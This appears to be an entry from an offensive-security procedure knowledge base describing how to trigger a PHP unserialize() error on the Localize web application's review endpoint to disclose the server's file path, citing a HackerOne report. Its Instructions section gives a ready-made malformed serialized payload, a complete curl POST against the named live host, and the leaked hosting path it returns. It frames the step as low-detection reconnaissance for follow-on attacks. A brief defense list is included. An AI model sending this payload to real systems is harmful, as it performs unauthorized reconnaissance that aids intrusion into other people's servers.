---
tags:
  - information-disclosure
  - php
  - unserialize
  - path-disclosure
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:12.058Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3e3e0b17-a713-4347-b34f-8b750fb1fd91
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Trigger-PHP-Unserialize-Error-for-Path-Disclosure

## Summary

This procedure exploits a lack of input validation in the Localize application's review endpoint by submitting a malformed PHP serialized object in the review[phraseObject] parameter, triggering an unserialize() error that discloses the full server file path. It is primarily used in web application reconnaissance to reveal internal directory structures, which can facilitate further attacks like targeted file inclusion or privilege escalation.

## Description

The Localize application processes the review[phraseObject] parameter using PHP's unserialize() function without proper validation, allowing attackers to inject a malformed serialized string. When unserialize() encounters an invalid offset (e.g., at byte 133 of 192), it generates a PHP notice that includes the absolute file path of the executing script (index.php line 244). This vulnerability was reported in HackerOne report #7972 and affects the review endpoint at /review/{project_id}/languages/{language_id}. The attack requires only HTTP POST access and no authentication, making it suitable for unauthenticated reconnaissance against public-facing PHP web apps. Expected outcomes include exposure of paths like /var/www/vhosts/.../index.php, revealing hosting details and directory layouts.

## Requirements

1. Network access to the target web application (e.g., http://www.localize.io)
2. Knowledge of the review endpoint structure (e.g., /review/3C/languages/5)
3. An HTTP client capable of sending POST requests with form data (e.g., curl, Burp Suite, or browser dev tools)
4. Optional: Valid CSRF token if enforced by the application

## Defense

Defensive measures and detection strategies:

- Input validation: Sanitize and validate all serialized inputs before unserialize(), using whitelisting or avoiding unserialize() altogether in favor of JSON or safer deserialization.
- Error handling: Suppress or log PHP notices without exposing paths; configure display_errors=Off in production and use custom error handlers.
- Web Application Firewall (WAF): Rules to detect malformed serialized strings or unserialize patterns in POST data.
- Monitoring: Log unserialize errors and alert on path disclosures; use tools like fail2ban to block repeated attempts.

## Objectives

1. Trigger a PHP unserialize error to disclose the server's internal file path.
2. Gather information on the directory structure and hosting environment.
3. Enable follow-on attacks by understanding the file system layout.

## Instructions

### Step 1: Prepare the Malformed Payload

**Context**: Construct a serialized PHP object string that is intentionally malformed to cause an unserialize failure. Start with a valid base like 'TzoyMToiUGhyYXNlX0FuZHJvaWRfU3RyaW5nIjo2OntzOjg6IgAqAHZhbHVlI' and append excessive 'a' characters to force an offset error.

The full payload for review[phraseObject] is: TzoyMToiUGhyYXNlX0FuZHJvaWRfU3RyaW5nIjo2OntzOjg6IgAqAHZhbHVlIaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajtzOjQ6InRlc3QiO3M6NToiACoAaWQiO2k6MDtzOjEyOiIAKgBwaHJhc2VLZXkiO3M6NzoidGVzdGluZyI7czoxMDoiACoAZ3JvdXBJRCI7aTowO3M6MjQ6IgAqAGVuYWJsZWRGb3VUcmFuc2xhdGlvbiI7YjoxO3M6MTA6IgAqAGlzRW1wdHkiO2I6MDt9

### Step 2: Send the POST Request

**Context**: Submit the POST request to the review endpoint with the malformed phraseObject and other required parameters to mimic a legitimate review action.

Use curl to execute the request:

```bash
curl -X POST 'http://www.localize.io/review/3C/languages/5' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CSRFToken=your_csrf_token_here&review[editID]=cw3&review[referenceValue]=test&review[phraseObject]=TzoyMToiUGhyYXNlX0FuZHJvaWRfU3RyaW5nIjo2OntzOjg6IgAqAHZhbHVlIaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajtzOjQ6InRlc3QiO3M6NToiACoAaWQiO2k6MDtzOjEyOiIAKgBwaHJhc2VLZXkiO3M6NzoidGVzdGluZyI7czoxMDoiACoAZ3JvdXBJRCI7aTowO3M6MjQ6IgAqAGVuYWJsZWRGb3VUcmFuc2xhdGlvbiI7YjoxO3M6MTA6IgAqAGlzRW1wdHkiO2I6MDt9&review[phraseKey]=testing&review[phraseSubKey]=0&review[contributorID]=sh&review[newValue]=1&review[action]=approve'
```

> This command sends the form data to the endpoint. Replace 'your_csrf_token_here' with a valid token if required. The response will include the error notice with the path.

### Step 3: Analyze the Response

**Context**: Parse the HTTP response for PHP error messages indicating the unserialize failure and extract the disclosed path.

Expected response snippet: "PHP Notice: unserialize(): Error at offset 133 of 192 bytes in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 244"

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- information-disclosure
- php
- unserialize
- path-disclosure
